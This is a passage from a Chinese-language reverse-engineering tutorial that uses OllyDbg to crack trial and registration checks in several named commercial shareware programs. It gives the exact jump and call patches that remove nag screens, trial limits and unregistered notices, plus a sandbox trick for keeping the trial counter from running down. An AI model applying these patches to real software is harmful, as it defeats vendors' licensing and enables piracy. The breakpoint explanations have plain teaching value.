的地方就会停止程序运行。回到界面添加联系人，程序没有反应，但回到OD看已经来到了MessageBoxA处(进到MessageBoxA函数里)。一路F8单步单过，到达call User32.MessageBoxA，程序弹出错误框，按确定(“确定”按不了可能是因为显示弹框的线程在调试的时候被暂停了，没恢复过来就会卡住。这时按F12暂停，再F9运行，就可以按“确定”了；或者到T图标，在界面处右键->Resume All Threads。这两种方法原理差不多)，F8到ret指令，返回到上一级函数位置，查看上下代码没什么有用的信息。再一路F8返回上一级，查看上下汇编代码。\n\n```asm\n00412DD0                       .  83F8 04       cmp eax,0x4;eax与4对比\n00412DD3                       .  7C 1A         jl short Pixtopia.00412DEF;跳到EF，可以跳过E5的弹窗\n00412DD5                       .  8B4C24 10     mov ecx,dword ptr ss:[esp+0x10]\n00412DD9                       .  6A 10         push 0x10\n00412DDB                       .  68 00F74800   push Pixtopia.0048F700                   ;  ASCII \"Please register PixtopianBook\"\n00412DE0                       .  68 68FC4800   push Pixtopia.0048FC68                   ;  ASCII \"You've reached the limit of 4 entries per group.\\n\\nPlease register PixtopianBook today!\"\n00412DE5                       .  E8 03350400   call Pixtopia.004562ED;间接调用MessageBox函数\n00412DEA                       .  E9 DD000000   jmp Pixtopia.00412ECC\n00412DEF                       > \\8D4C24 14     lea ecx,dword ptr ss:[esp+0x14]\n00412DF3                       .  E8 38610100   call Pixtopia.00428F30\n00412DF8                       .  68 D8784900   push Pixtopia.004978D8\n```\n\n```asm\njl short Pixtopia.00412DEF\t\t=>\t\tjmp short Pixtopia.00412DEF\n```\n\n大程序的话建议修改一处就保存一次，因为会遇到很多分岔路，很多陷阱。然后在修改过的程序做第二次修改，以此类推。\n\n**突破3个组**\n\n按上述方法\n\n```asm\n00408B05                       .  83F8 03       cmp eax,0x3;跟3比较\n00408B08                       .  7C 2A         jl short Pixtopia.00408B34;跳到34，可以跳过18的弹窗\n00408B0A                       .  6A 10         push 0x10\n00408B0C                       .  68 00F74800   push Pixtopia.0048F700                   ;  ASCII \"Please register PixtopianBook\"\n00408B11                       .  68 B4F64800   push Pixtopia.0048F6B4                   ;  ASCII \"You've reached the limit of 3 groups.\\n\\nPlease register PixtopianBook today!\"\n00408B16                       .  8BCB          mov ecx,ebx\n00408B18                       .  E8 D0D70400   call Pixtopia.004562ED;间接调用MessageBox函数\n00408B1D                       .  5E            pop esi                                  ;  Pixtopia.004761E8\n00408B1E                       .  5B            pop ebx                                  ;  Pixtopia.004761E8\n00408B1F                       .  8B8C24 340100>mov ecx,dword ptr ss:[esp+0x134]         ;  Pixtopia.00456A5E\n00408B26                       .  64:890D 00000>mov dword ptr fs:[0],ecx\n00408B2D                       .  81C4 40010000 add esp,0x140\n00408B33                       .  C3            retn\n00408B34                       > \\6A 00         push 0x0\n00408B36                       .  8D4C24 24     lea ecx,dword ptr ss:[esp+0x24]\n00408B3A                       .  E8 21E20100   call Pixtopia.00426D60\n```\n\n```asm\njl short Pixtopia.00408B34\t\t=>\t\tjmp short Pixtopia.00408B34\n```\n\n如果是两次一起保存，右键->复制到可执行文件->所有修改。\n\n**去除未注册信息**\n\n查找`UNREGISTERED`字符串。\n\n到M图标查找字符串，Ctrl+B或右键->查找，在ASCII找一下。\n\n```\n0048F97F  75 6E 72 65 67 69 73 74 65 72 65 64 20 76 65 72  unregistered ver\n0048F98F  73 69 6F 6E 20 6F 66 20 50 69 78 74 6F 70 69 61  sion of Pixtopia\n0048F99F  6E 42 6F 6F 6B 2E 20 50 6C 65 61 73 65 20 72 65  nBook. Please re\n0048F9AF  67 69 73 74 65 72 20 74 6F 64 61 79 21 00 00 00  gister today!...\n0048F9BF  00 43 49 6E 69 74 44 69 61 6C 6F 67 42 61 72 00  .CInitDialogBar.\n0048F9CF  00 43 4C 65 66 74 46 6F 72 6D 56 69 65 77 00 00  .CLeftFormView..\n0048F9DF  00 4E 6F 74 65 20 20 20                          .Note\n```\n\n选中要修改的地方，右键->二进制->编辑，选中保持大小，因为可能会有对齐方面的问题，意味着我们写的长度不能比它长。由于不能直接在M图标中保存，所以要返回到C图标保存。记住地址起始处48F97F，返回到C图标的数据窗口快速定位Ctrl+G，右键->复制到可执行文件->右键->保存文件。\n\n{% asset_img 实验5.4.png 实验5.4 %}\n\n再次查找ASCII还有没有UNREGISTERED字符串，重复上述步骤，查完ASCII再查UNICODE，重复上述步骤。\n\n**去除上面图片的注册信息**\n\n一样在M图标查找字符串，回到C的数据窗口查找。选中开始字节右键->查找参考->双击，就会去到字符串的反汇编窗口。查看上下汇编代码\n\n```asm\n0040C22F   > \\81FD 07090000 cmp ebp,0x907\n0040C235   .  75 1A         jnz short Pixtopia.0040C251;让它跳，绕过37地址\n0040C237   .  68 74F94800   push Pixtopia.0048F974                   ;  ASCII \"This is an registered version for v5leon9 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\"\n0040C23C   .  8BCE          mov ecx,esi\n0040C23E   .  E8 BDFEFFFF   call Pixtopia.0040C100\n0040C243   .  8B56 1C       mov edx,dword ptr ds:[esi+0x1C]\n0040C246   .  6A 01         push 0x1                                 ; /Erase = TRUE\n0040C248   .  6A 00         push 0x0                                 ; |pRect = NULL\n0040C24A   .  52            push edx                                 ; |hWnd = NULL\n0040C24B   .  FF15 E4564700 call dword ptr ds:[<&USER32.InvalidateRe>; \\InvalidateRect\n0040C251   >  55            push ebp\n0040C252   .  8BCE          mov ecx,esi\n0040C254   .  E8 7F230500   call Pixtopia.0045E5D8\n```\n\n```asm\njnz short Pixtopia.0040C251\t\t=>\t\tjz short Pixtopia.0040C251\n```\n\n### 11.1 查找字符串的几种方法\n\n1. 右键->查找->所有参考文本字串\n2. 右键->中文搜索引擎->智能搜索\n3. M图标右键查找字符串\n\n## 12. OD两种断点\n\nOD从原理上来区分，有两种不同的断点：软件断点和硬件断点。\n\n内存断点属于一种特殊的软件断点。\n\n- 内存断点每次只能设置一个，如果设置了另一个，上一个会被自动删除。\n- 设置一个内存断点，会改变整块(4KB)内存的属性。\n- 内存断点明显降低OD性能，因为OD经常校对内存。\n\n软件断点：\n\n- F2设置的断点就是软件断点。\n- 设置该断点的原理是在断点处重写代码，插入一个int 3中断指令，当CPU执行到int 3指令的时候，OD就可以获得控制权。\n\n硬件断点：\n\n- 可行性依赖于CPU的物理支持。\n- 调试寄存器Dr0\\~Dr7，其中Dr0\\~Dr3寄存器用来存放中断地址，Dr4、Dr5保留不使用，Dr6、Dr7用来记录Dr0~Dr3的属性(如读、写还是执行，单位是字节、字还是双字)，所以硬件断点最多只能有4个。\n\n软件断点只能在OD的CPU界面下，在数据段下不了，在一条指令的中间也下不了。\n\n硬件断点可以下在Windows的动态链接库里，因为软件断点下在DLL文件中不会被保存，重启程序后将丢失断点。\n\n## 13. 实验六 VisualSite Designer\n\n{% asset_img 实验6.png 实验6 %}\n\n{% asset_img 实验6.1.png 实验6.1 %}\n\n目标：破除只能打开10次的限制，去除软件关闭后弹出的广告。\n\n**破除打开10次的限制**\n\n小技巧：用杀毒软件的沙盘模式运行不会减少次数，因为在沙盘里面只是虚拟出一个环境，将用户模式与底层之间再加一层分隔开，次数是通过写入文件或写入注册表的形式来计算的。当关闭沙盘时，沙盘的文件清空，记录的数据也不复存在。\n\nCtrl+F8自动步过遇到问题下断点，F7步入。重复以上。\n\n> 程序跳出循环的办法：在循环的下一条指令下断点，按F9运行。\n\n仔细看下面这条断点指令，jmp到MFC42里面，mfc42.dll是windows系统的一个动态链接文件，不可或缺。\n\n```asm\n004BD520  |.  E8 43000000   call <jmp.&MFC42.#AfxWinMain_1576>\n```\n\n所以接下来我们会去到DLL的段，下断点的方式与之前不同，右键->断点->硬件执行。可在调试->硬件断点处查看。\n\n```asm\n6E344F38    FFD6            call esi                        ; VisualSi.0058B264\n```\n\n一般地址数值较大的是存放DLL的领空。\n\n综上，在用户领空就下软件断点，在动态链接库领空就下硬件断点。\n\n走到下面这条指令还需要继续往下走吗？我们试试。\n\n```asm\n00489912   .  E8 132B0300   call <jmp.&MFC42.#CDialog::DoModal_2514>\n```\n\n又走到了一个DLL领空，下硬件断点，继续步入。\n\n```asm\n6E370AD8    E8 73D6FEFF     call mfc42.#CWnd::RunModalLoop_5718\n```\n\n发现我们一直在DLL领空死循环，NAG窗口出来了。但是我们在DLL领空操作不了，所以找最近跳转的用户领空就可以了。回到用户断点处。\n\n```asm\n00489912   .  E8 132B0300   call <jmp.&MFC42.#CDialog::DoModal_2514>\n```\n\nF8步过，弹出窗口，在窗口处点一下进入程序，OD跳到下一条指令，窗口消失，call指令完成。即call指令执行的是打开NAG窗口，让次数-1，返回值存到eax里去。下一条指令是eax与1对比，eax是1就进入到程序里去，非1退出程序。可以在call指令后面添加注释返回值要为1。\n\n```asm\n00489912   .  E8 132B0300   call <jmp.&MFC42.#CDialog::DoModal_2514>;NAG,return 1\n00489917   .  83F8 01       cmp eax,0x1\n```\n\n那怎么才能让返回值为1呢？简单粗暴的方法就是直接改call指令。\n\n```asm\ncall <jmp.&MFC42.#CDialog::DoModal_2514>\t\t=>\t\tmov eax,1\n```\n\n将修改的保存起来。OD载入新程序，F9运行，会发现一开始NAG窗口已经不见了。\n\n**去除软件关闭后弹出的广告**\n\nOD载入新程序，F9运行，进入程序，点关闭按钮，会弹出广告，这时回到OD按F12暂停，停在了win32u模块，dll领空。查看K图标，K的作用是：截止到暂停处，通过调用堆栈判断出哪些函数被调用过。\n\n```asm\n地址       堆栈       函数过程 / 参数                       调用来自                      结构\n0019EAF0   75A45E55   win32u.NtUserGetMessage               user32.75A45E4F               0019EB2C\n0019EB30   6E344425   user32.GetMessageA                    mfc42.6E34441F                0019EB2C\n0019EB34   0058B264     pMsg = VisualSi.0058B264\n0019EB38   00000000     hWnd = NULL\n0019EB3C   00000000     MsgFilterMin = 0x0\n0019EB40   00000000     MsgFilterMax = 0x0\n0019EB4C   6E35E253   包含mfc42.6E344425                      mfc42.6E35E251                0019EB70\n0019EB74   6E370ADD   mfc42.#CWnd::RunModalLoop_5718        mfc42.6E370AD8                0019EB70\n0019EBBC   00480C29   ? <jmp.&MFC42.#CDialog::DoModal_2514  VisualSi.00480C24             0019EBB8\n0019EC2C   6E3478D5   包含VisualSi.00480C29                   mfc42.6E3478D3                0019EC30\n0019EC34   6E33C51B   mfc42.6E3478C0                        mfc42.6E33C516                0019EC30\n0019ECCC   6E343B84   包含mfc42.6E33C51B                      mfc42.6E343B82                0019ECC8\n0019ECF4   6E33BD7B   包含mfc42.6E343B84                      mfc42.6E33BD79                0019ECF0\n0019ED74   6E33BC2F   mfc42.#AfxCallWndProc_1109            mfc42.6E33BC2A                0019ED70\n0019EDBC   75A636DB   包含mfc42.6E33BC2F                      user32.75A636D9               0019EDB8\n0019EDE8   75A5A66A   user32.75A636B0                       user32.75A5A665               0019EDE4\n0019EECC   75A5A26A   user32.75A5A330                       user32.75A5A265               0019EEC8\n0019EF30   75A5DE3F   包含user32.75A5A26A                     user32.75A5DE3D               0019EF2C\n0019EF6C   77624E9D   包含user32.75A5DE3F                     ntdll.77624E9B                0019EF68\n```\n\n发现几乎大部分的函数都在操作系统领空，除了一个是在用户领空的，双击这行的“调用来自”，进入用户领空。\n\n```asm\n0019EBBC   00480C29   ? <jmp.&MFC42.#CDialog::DoModal_2514  VisualSi.00480C24             0019EBB8\n```\n\n在00480C24处下个断点。重新载入程序运行，关闭，没有弹出广告，OD停在了断点处。\n\n```asm\n00480C24   .  E8 01B80300   call <jmp.&MFC42.#CDialog::DoModal_2514>\n00480C29   .  8D4C24 00     lea ecx,dword ptr ss:[esp]\n```\n\n如果按F8，广告弹出，关闭广告，跳到下一条指令。即`call <jmp.&MFC42.#CDialog::DoModal_2514>`的作用就是用来弹出广告的。那我们不想要它弹广告，就将这条指令用`nop`填充。\n\n```asm\ncall <jmp.&MFC42.#CDialog::DoModal_2514>\t\t=>\t\tnop\n```\n\n保存到新程序。OD载入查看，没有倒数，关闭也没有广告了。\n\n### 13.1 破解的绝对方案\n\n就VisualSite Designer来说，程序的行为发生改变，在于注册前和注册后的行为发生改变。如果运行完10次后，程序就不允许我们打开，代码走的路线与之前的不同。用什么来实现代码走的路线不同呢？一种是条件判断(低级)，另一种是jmp+变量(高级)。\n\n#### 13.1.1 条件判断\n\nVisualSite Designer就是用条件判断来选择代码实现。\n\n从程序入口点开始，一路F8，遇到条件跳转指令特别注意，跳转已实现用“Y”注释，跳转未实现用“N”注释。一直注释下去，直到弹出倒数窗口，下断点，重载，运行，删断点，进去注释，弹出倒数窗口，下断点，以此类推，直到弹出最后一个NAG窗口(也就是之前我们走到的用户地址9912处)。\n\n以下情况可以不用注释：\n\n1. 如果跳转指令在循环里面可以不用理会，因为循环里面的跳转只是为了实现循环。\n2. 如果跳转指令在动态链接库的领空也可以不用理会，因为我们暂时不能修改动态链接库的东西(如果跳转进到动态链接库可以按Alt+F9返回到用户领空)。\n3. 如果遇到无条件跳转指令jmp也不用理会，因为这个程序没有jmp+变量的高级跳转。\n\n注释完后，在OD里将原来的程序次数用到0。再载入OD，F8对着注释查看条件跳转指令是否改变，如果发生改变根据我们之前学过的绕过跳转指令来实现程序原本功能。(将程序次数用到0，我们之前修改的1，2版本也不能用了，因为它们用的都是同一个文件或注册表)\n\n```asm\n004898EF   .  85C0          test eax,eax;在信息窗口可以看到eax=0\n004898F1   . /0F8E A1000000 jle VisualSi.00489998                    ;  n\n```\n\n```asm\ntest eax,eax\t\t=>\t\tmov eax,1\n```\n\n{% asset_img 实验6.2.png 实验6.2 %}\n\n现在是0也可以进入程序了，再结合去除NAG窗口和关闭后弹出的广告就完美了！(这个程序也避免了原来程序用完次数，导致1、2也用不了的情况)\n\n这种方法破解程序屡试不爽，同时需要大量的耐心。\n\n## 14. 实验七 PC Surgen\n\n{% asset_img 实验7.png 实验7 %}\n\n{% asset_img 实验7.1.png 实验7.1 %}\n\n{% asset_img 实验7.2.png 实验7.2 %}\n\n(这个程序在Win10一直报错，界面呈现也不对，所以拿我的Windows 2003靶机来调试吧)\n\n目标：去除NAG窗口，去除未注册信息，解除天数限制。\n\n这个程序弹出NAG窗口后等几秒后会自动进入到界面。NAG窗口很大可能是破解的切入点，因为只要找到了NAG的触发点，也就是找到了注册和未注册的跳转、判断位置。\n\n### 14.1 基本的打补丁方式(暴力破解)\n\nOD载入程序，运行到界面处。\n\n看到图2标题，它说未注册，还剩5天时间。那可不可以像实验五那样直接改字符串呢？肯定不可以啊，因为那个倒数是动态的，应该是有内置函数用来算倒数的，这样的话覆盖到函数部分会发生错误，很有可能程序都打不开。\n\n在C图标里右键->查找->所有参考文本字符串，弹窗R图标，右键->查找文本，查找`<unregistered`，将“区分大小写”与“整个范围”勾上。如果光标处不是想要找的字符串，可以右键->查找下一个(Ctrl+L)。找到你所需要的字符串，双击去到汇编代码处。\n\n```asm\n005CC836   . /0F85 F9000000 jnz pcsurgeo.005CC935\n005CC83C   . |68 70CB5C00   push pcsurgeo.005CCB70                   ;  ASCII 50,\"C Surgeon <unregistered - \"\n005CC841   . |D905 3CCA5C00 fld dword ptr ds:[0x5CCA3C]\n005CC847   . |A1 8CEC6000   mov eax,dword ptr ds:[0x60EC8C]\n005CC84C   . |DC20          fsub qword ptr ds:[eax]\n005CC84E   . |83C4 F4       add esp,-0xC\n005CC851   . |DB3C24        fstp tbyte ptr ss:[esp]\n005CC854   . |9B            wait\n005CC855   . |8D55 E4       lea edx,dword ptr ss:[ebp-0x1C]\n005CC858   . |B8 94CB5C00   mov eax,pcsurgeo.005CCB94                ;  UNICODE \"0\"\n005CC85D   . |E8 42FAE3FF   call pcsurgeo.0040C2A4\n005CC862   . |FF75 E4       push dword ptr ss:[ebp-0x1C]\n005CC865   . |68 A0CB5C00   push pcsurgeo.005CCBA0                   ;  ASCII 20,\"days remaining..>\"\n005CC86A   . |8D45 E8       lea eax,dword ptr ss:[ebp-0x18]\n005CC86D   . |BA 03000000   mov edx,0x3\n005CC872   . |E8 A98AE3FF   call pcsurgeo.00405320\n005CC877   . |8B55 E8       mov edx,dword ptr ss:[ebp-0x18]          ;  gdi32.77C11307\n005CC87A   . |8B45 FC       mov eax,dword ptr ss:[ebp-0x4]\n005CC87D   . |E8 22D5EAFF   call pcsurgeo.00479DA4\n005CC882   . |8B45 FC       mov eax,dword ptr ss:[ebp-0x4]\n005CC885   . |8B80 20120000 mov eax,dword ptr ds:[eax+0x1220]\n005CC88B   . |C680 20030000>mov byte ptr ds:[eax+0x320],0x1\n005CC892   . |8B10          mov edx,dword ptr ds:[eax]\n005CC894   . |FF92 EC000000 call dword ptr ds:[edx+0xEC]\n005CC89A   . |8D45 F4       lea eax,dword ptr ss:[ebp-0xC]\n005CC89D   . |BA BCCB5C00   mov edx,pcsurgeo.005CCBBC\n005CC8A2   . |E8 7587E3FF   call pcsurgeo.0040501C\n005CC8A7   . |68 02000080   push 0x80000002\n005CC8AC   . |6A 00         push 0x0\n005CC8AE   . |6A 00         push 0x0\n005CC8B0   . |B9 D4CB5C00   mov ecx,pcsurgeo.005CCBD4                ;  ASCII 53,\"oftware\\Dean Software\\PC Surgeon\"\n005CC8B5   . |B2 01         mov dl,0x1\n005CC8B7   . |A1 1CE94900   mov eax,dword ptr ds:[0x49E91C]\n005CC8BC   . |E8 BB2BEDFF   call pcsurgeo.0049F47C\n005CC8C1   . |8945 EC       mov dword ptr ss:[ebp-0x14],eax\n005CC8C4   . |33C0          xor eax,eax\n005CC8C6   . |55            push ebp\n005CC8C7   . |68 2EC95C00   push pcsurgeo.005CC92E\n005CC8CC   . |64:FF30       push dword ptr fs:[eax]\n005CC8CF   . |64:8920       mov dword ptr fs:[eax],esp\n005CC8D2   . |6A 00         push 0x0\n005CC8D4   . |8D45 E0       lea eax,dword ptr ss:[ebp-0x20]\n005CC8D7   . |50            push eax\n005CC8D8   . |B9 00CC5C00   mov ecx,pcsurgeo.005CCC00\n005CC8DD   . |BA 1CCC5C00   mov edx,pcsurgeo.005CCC1C\n005CC8E2   . |8B45 EC       mov eax,dword ptr ss:[ebp-0x14]          ;  gdi32.77BF820F\n005CC8E5   . |E8 122DEDFF   call pcsurgeo.0049F5FC\n005CC8EA   . |8B45 E0       mov eax,dword ptr ss:[ebp-0x20]          ;  usp10.74B0F772\n005CC8ED   . |8B55 F4       mov edx,dword ptr ss:[ebp-0xC]\n005CC8F0   . |E8 B78AE3FF   call pcsurgeo.004053AC\n005CC8F5   . |74 21         je short pcsurgeo.005CC918\n005CC8F7   . |8B55 FC       mov edx,dword ptr ss:[ebp-0x4]\n005CC8FA   . |8B45 FC       mov eax,dword ptr ss:[ebp-0x4]\n005CC8FD   . |E8 A2200300   call pcsurgeo.005FE9A4\n005CC902   . |8B45 F4       mov eax,dword ptr ss:[ebp-0xC]\n005CC905   . |50            push eax\n005CC906   . |BA 1CCC5C00   mov edx,pcsurgeo.005CCC1C\n005CC90B   . |B9 00CC5C00   mov ecx,pcsurgeo.005CCC00\n005CC910   . |8B45 EC       mov eax,dword ptr ss:[ebp-0x14]          ;  gdi32.77BF820F\n005CC913   . |E8 6430EDFF   call pcsurgeo.0049F97C\n005CC918   > |33C0          xor eax,eax\n005CC91A   . |5A            pop edx                                  ;  usp10.74B0F772\n005CC91B   . |59            pop ecx                                  ;  usp10.74B0F772\n005CC91C   . |59            pop ecx                                  ;  usp10.74B0F772\n005CC91D   . |64:8910       mov dword ptr fs:[eax],edx\n005CC920   . |68 42C95C00   push pcsurgeo.005CC942\n005CC925   > |8B45 EC       mov eax,dword ptr ss:[ebp-0x14]          ;  gdi32.77BF820F\n005CC928   . |E8 4377E3FF   call pcsurgeo.00404070\n005CC92D   . |C3            retn\n005CC92E   .^|E9 D17EE3FF   jmp pcsurgeo.00404804\n005CC933   .^|EB F0         jmp short pcsurgeo.005CC925\n005CC935   > \\BA 30CA5C00   mov edx,pcsurgeo.005CCA30                ;  ASCII \"PC Surgeon\"\n```\n\n看到上面指令的第2条就是要找的字符串，下面还有“days remaining..”的字样，不难猜测两条注释中间的指令就是计算倒数的指令。往上看可以看到条件跳转指令。经过这么多次实验，条件跳转指令的重要性不必再说了吧。如果跳转实现，就会跳到CC935地址，绕过计算倒数指令。\n\n先尝试一下，在跳转指令下个断点，重载程序，运行，将Z标志位改为0，跳转，F9运行到程序，发现图1的NAG窗口绕过了，直接进到界面，界面的标题也没有了“<unregistered ... days remaining..”字样。说明跳过的指令还包含了NAG窗口。现在来打补丁，打完保存数据到文件。(也可以跟下面步骤一起打完再保存，但我太傻了还是修改一个保存一个吧)\n\n```asm\njnz pcsurgeo.005CC935\t\t=>\t\tjz pcsurgeo.005CC935\n```\n\n载入新程序，没问题。但是图3还是显示未注册，说明破解还不完全。同样的方法查找字符串，不能用实验五查找字符串的方法的原因是就算改了字符串，但`Use Reg Key`还在，也还是未完全破解。\n\n```asm\n00562466   . /75 22         jnz short pcsurgeo.0056248A\n00562468   . |8B83 08030000 mov eax,dword ptr ds:[ebx+0x308]\n0056246E   . |B2 01         mov dl,0x1\n00562470   . |E8 1F78F1FF   call pcsurgeo.00479C94\n00562475   . |8B83 24030000 mov eax,dword ptr ds:[ebx+0x324]\n0056247B   . |BA B8265600   mov edx,pcsurgeo.005626B8                ;  ASCII \"<Unregistered Version>\"\n00562480   . |E8 1F79F1FF   call pcsurgeo.00479DA4\n00562485   . |E9 E0010000   jmp pcsurgeo.0056266A\n0056248A   > \\8B83 08030000 mov eax,dword ptr ds:[ebx+0x308]\n```\n\n字符串的上面也有一个跳转指令，如果跳转实现跳到248A地址，绕过字符串。同样的方法尝试一下。跳转指令下断点，重载运行，界面help->about，没有弹出窗口，OD停到断点处，将Z标志位改为0，运行程序，弹出已注册窗口。\n\n{% asset_img 实验7.3.png 实验7.3 %}\n\n说明我们改对了，现在去打补丁。\n\n```asm\njnz short pcsurgeo.0056248A\t\t=>\t\tjz short pcsurgeo.0056248A\n```\n\n保存数据到文件，破解实现。\n\n### 14.2 根据代码逻辑破解\n\n这个程序比较简单，所以修改几条跳转指令足以实现破解。但很多程序都是比较大型的，未注册到注册可能经过层层验证，可能需要修改很多条跳转指令。如果不想修改跳转指令，那就需要了解代码的内部逻辑。\n\n同样，通过查找字符串去到`<unregistered`汇编代码处。往上找最近的call指令，下断点，重载运行，分析代码逻辑。\n\n```asm\n005CC81B   .  E8 9C5FEDFF   call pcsurgeo.004A27BC\n005CC820   .  A1 8CEB6000   mov eax,dword ptr ds:[0x60EB8C]\n;函数返回值存到eax里，在信息窗口可以看到eax=ds:[0x60EB8C]=610c4a\n005CC825   .  8038 00       cmp byte ptr ds:[eax],0x0\n;函数返回值与0对比(相减),ds:[eax]=00\n005CC828   .  0F85 07010000 jnz pcsurgeo.005CC935;相减为0，不跳过\n005CC82E   .  A1 DCF16000   mov eax,dword ptr ds:[0x60F1DC]\n;eax=ds:[0x60F1DC]=610c5e\n005CC833   .  8038 00       cmp byte ptr ds:[eax],0x0;ds:[eax]=00\n005CC836      0F85 F9000000 jnz pcsurgeo.005CC935;相减为0，不跳过\n;为什么有两个判断？判断是否注册，未注册的话判断还剩几天\n005CC83C   .  68 70CB5C00   push pcsurgeo.005CCB70                   ;  ASCII 50,\"C Surgeon <unregistered - \"\n005CC841   .  D905 3CCA5C00 fld dword ptr ds:[0x5CCA3C]\n; fld浮点指令，相当于push，ds:[0x5CCA3C]=15.00000\n005CC847   .  A1 8CEC6000   mov eax,dword ptr ds:[0x60EC8C]\n;eax=ds:[0x60EC8C]=610c54\n005CC84C   .  DC20          fsub qword ptr ds:[eax]\n;fsub相当于sub，st=15.00000,ds:[eax]=10.00000\n;未注册的用户可以使用15天，ds:[eax]=ds:[0x610c54]=10存的是经过的天数\n005CC84E   .  83C4 F4       add esp,-0xC\n005CC851   .  DB3C24        fstp tbyte ptr ss:[esp];st=5,剩余的天数\n005CC854   .  9B            wait\n005CC855   .  8D55 E4       lea edx,dword ptr ss:[ebp-0x1C]\n005CC858   .  B8 94CB5C00   mov eax,pcsurgeo.005CCB94                ;  UNICODE \"0\"\n005CC85D   .  E8 42FAE3FF   call pcsurgeo.0040C2A4\n005CC862   .  FF75 E4       push dword ptr ss:[ebp-0x1C];将剩余的天数入栈\n005CC865   .  68 A0CB5C00   push pcsurgeo.005CCBA0                   ;  ASCII 20,\"days remaining..>\"\n```\n\n分析得很清晰了，我们要绕过的话就饶过call函数后面的第一次跳转，等等！这不是跟暴力破解一样吗？！当然我们不是这么做。(虚晃一枪)\n\n题外话：选中汇编代码如`mov eax,dword ptr ds:[0x60EB8C]`，信息窗口会显示`ds:[0x60EB8C]=00610c4a`，在信息窗口中选中，右键->数据窗口中跟随数值，就可在数据窗口中看到610c4a的值。\n\n已知call指令结束，60eb8c地址存的东西要赋值给eax，eax通常存的是返回值或返回值的指针，所以不管怎样，死抓60eb8c就对了！选中汇编代码右键->查找参考->地址常量，弹出R图标，里面是整个程序所有用到60eb8c地址的汇编代码。我们现在要找初始化60eb8c地址的地址，因为那个地址是判断注册与未注册的分叉点。右键->在每个命令上设置断点。重载，运行，停在了第一个断点处，也就是程序初始化60eb8c地址处。\n\n```asm\n005C2BF6   .  8B15 8CEB6000 mov edx,dword ptr ds:[0x60EB8C]          ;  pcsurgeo.00610C4A\n;ecx=ds:[0x60EB8C]=610c4a\n005C2BFC   .  8802          mov byte ptr ds:[edx],al\n;将al赋值给610c4a，al=00,ds:[610c4a]=00\n005C2BFE   .  A1 8CEB6000   mov eax,dword ptr ds:[0x60EB8C]\n;ds:[0060eb8c]=00610c4a\n005C2C03   .  8038 00       cmp byte ptr ds:[eax],0x0;将ds:[eax]与0比较\n005C2C06   .  75 0D         jnz short pcsurgeo.005C2C15;相减为0不跳转\n005C2C08   .  E8 6307EEFF   call pcsurgeo.004A3370\n005C2C0D   .  A1 8CEC6000   mov eax,dword ptr ds:[0x60EC8C]\n005C2C12   .  DD18          fstp qword ptr ds:[eax]\n005C2C14   .  9B            wait\n005C2C15   >  8D45 9C       lea eax,dword ptr ss:[ebp-0x64]\n```\n\n其中两种改法：\n\n```asm\nmov byte ptr ds:[edx],al\t=>\t\tmov byte ptr ds:[edx],1\n```\n\n{% asset_img 实验7.4.png 实验7.4 %}\n\n上面这种改法需要重定位，可能不太安全，那可以用下面这种改法。\n\n```asm\ncmp byte ptr ds:[eax],0x0\t=>\t\tmov byte ptr ds:[eax],1\njnz short pcsurgeo.005C2C15\t=>\t\tjmp short pcsurgeo.005C2C15\n```\n\n保存后重载运行，整个程序就处于注册阶段了，不需要一次次修改跳转指令。\n\n## 15. 实验八 MrBills\n\n{% asset_img 实验8.png 实验8 %}\n\n{% asset_img 实验8.1.png 实验8.1 %}\n\n{% asset_img 实验8.2.png 实验8.2 %}\n\n目标：破解注册。\n\n想要定位到`You have entered`字符串，右键->中文搜索引擎->智能搜索，找到双击去到反汇编窗口。\n\n```asm\n004299B9   . /75 36         jnz short MrBills.004299F1\n004299BB   . |6A 30         push 0x30\n004299BD   . |68 70134C00   push MrBills.004C1370                    ;  You have entered an invalid email address or license number.  Please try again.\n004299C2   . |E8 74270800   call MrBills.004AC13B\n004299C7   . |8D8E 20010000 lea ecx,dword ptr ds:[esi+0x120]\n004299CD   . |E8 567CFDFF   call MrBills.00401628\n004299D2   . |8BCF          mov ecx,edi                              ;  MrBills.<ModuleEntryPoint>\n004299D4   . |E8 4F7CFDFF   call MrBills.00401628\n004299D9   . |53            push ebx\n004299DA   . |8BCE          mov ecx,esi                              ;  MrBills.<ModuleEntryPoint>\n004299DC   . |E8 D5A60700   call MrBills.004A40B6\n004299E1   . |8D8E 7C010000 lea ecx,dword ptr ds:[esi+0x17C]\n004299E7   . |E8 83D00700   call MrBills.004A6A6F\n004299EC   . |E9 29010000   jmp MrBills.00429B1A\n004299F1   > \\6A 40         push 0x40\n004299F3   .  68 50134C00   push MrBills.004C1350                    ;  Thank you for registering!\n```\n\n找到上面最近的跳转指令，跳转指令未实现，若实现则跳过未注册弹窗，去到`Thank you for registering!`，不知道自己的推测对不对的话就先改标志位，因为标志位在重载程序不会被保存，错了重载程序即可。\n\n{% asset_img 实验8.3.png 实验8.3 %}\n\n貌似没有问题，现在就来打补丁吧。\n\n```asm\njnz short MrBills.004299F1\t\t=>\t\tjmp short MrBills.004299F1\n```\n\n运行程序，注册后界面标题的未注册提示也已经没了。但每次启动都要注册显然很麻烦，而且真正的注册成功后`Register...`是变灰色的，而且会弹窗提示，所以这个并没有注册成功。因为如果这样打补丁的话，相当于注册与其他功能分隔开了。\n\n我们找是找对了，但要进一步追踪实现跳转的条件。jnz的意思是如果Z标志位非0则跳转，为0则不跳转。哪条指令改变了Z标志位？往上找，看到test指令，test指令是进行按位与运算，值为0在Z标志位置1，非0置0。\n\n```asm\n004299B5   .  84C0          test al,al\t\t\t\t\t\t;非0注册\n004299B7   .  59            pop ecx                                  ;  kernel32.7716FA29\n004299B8   .  53            push ebx\n004299B9      75 36         jnz short MrBills.004299F1               ;  要实现跳转\n```\n\n是什么改变了al的值？再往上找。call指令的返回值存放在eax中，所以call指令会影响al的值。要进入这个call函数了解内部逻辑。注释标志1为第一个进入的函数，因为可能接下来要进入很多个函数，很乱，像走迷宫一样，所以标志数字说明你走过，走的是哪个函数。\n\n```asm\n004299AD   .  E8 9AD7FDFF   call MrBills.0040714C\t\t\t\t;需进入1\n004299B2   .  59            pop ecx                                  ;  kernel32.7716FA29\n004299B3   .  33DB          xor ebx,ebx\n004299B5   .  84C0          test al,al\t\t\t\t\t\t\t;非0注册\n004299B7   .  59            pop ecx                                  ;  kernel32.7716FA29\n004299B8   .  53            push ebx\n004299B9      75 36         jnz short MrBills.004299F1               ;  